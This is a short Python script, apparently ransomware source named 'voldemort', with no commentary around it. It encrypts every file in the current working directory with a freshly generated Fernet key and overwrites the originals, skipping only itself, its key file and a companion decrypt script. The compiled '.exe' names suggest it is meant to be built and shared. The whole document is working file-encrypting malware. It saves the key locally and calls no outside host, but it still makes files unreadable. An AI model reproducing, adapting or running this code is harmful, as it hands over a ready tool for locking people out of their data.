import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == 'voldemort.py' or file == 'key'  or file == 'decrypt.py' or file == 'voldemort.exe' or file == 'decrypt.exe':
        continue
    elif os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open('key', 'wb') as keyfile:
    keyfile.write(key)
    keyfile.close()

for need_encrypt in files:
    with open(need_encrypt, 'rb') as encrypted:
        data = encrypted.read()
    encrypted_data = Fernet(key).encrypt(data)
    with open(need_encrypt, 'wb') as encrypt_success:
        encrypt_success.write(encrypted_data)
        encrypt_success.flush()
        encrypt_success.close()

print('All the file has been encrypted successfully', flush=True)
